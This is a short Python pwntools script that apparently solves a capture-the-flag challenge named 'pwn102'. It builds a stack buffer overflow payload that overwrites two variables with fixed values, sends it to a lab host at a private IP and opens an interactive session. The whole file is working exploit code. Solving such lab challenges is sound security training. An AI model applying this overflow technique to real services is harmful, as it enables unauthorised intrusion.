from pwn import *

context.binary = binary = "./pwn102.pwn102"

# Should change the value into little endian in 4bytes
# p32(0xc0ff33) = \x33\xff\xc0\x00
payload = b"1"*((0x70-0x8)) + p32(0xc0d3) + p32(0xc0ff33)
# payload = b"1"*((0x70-0x8)) + b"0x0000c0d3" + b"0x00c0ff33"
# p = process()
p = remote('10.10.151.98', 9002)
p.recv()
p.sendline(payload)
p.interactive()